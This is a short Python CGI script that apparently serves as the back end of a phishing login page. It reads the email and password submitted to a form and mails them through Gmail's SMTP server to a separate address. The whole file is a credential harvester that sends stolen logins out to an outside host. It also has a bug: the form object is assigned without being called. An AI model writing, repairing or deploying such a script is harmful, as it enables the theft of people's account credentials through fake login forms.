import cgi
import smtplib


form = cgi.FieldStorage
email = form.getvalue("email")
password = form.getvalue("password")


# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)
# start TLS for security
s.starttls()
# Authentication
s.login("IDLEPythonScript@gmail.com", ".")
# message to be sent
message = str(email) + " " + str(password)
# sending the mail
s.sendmail("IDLEPythonScript@gmail.com", "myemail@gmail.com", message)
# terminating the session
s.quit()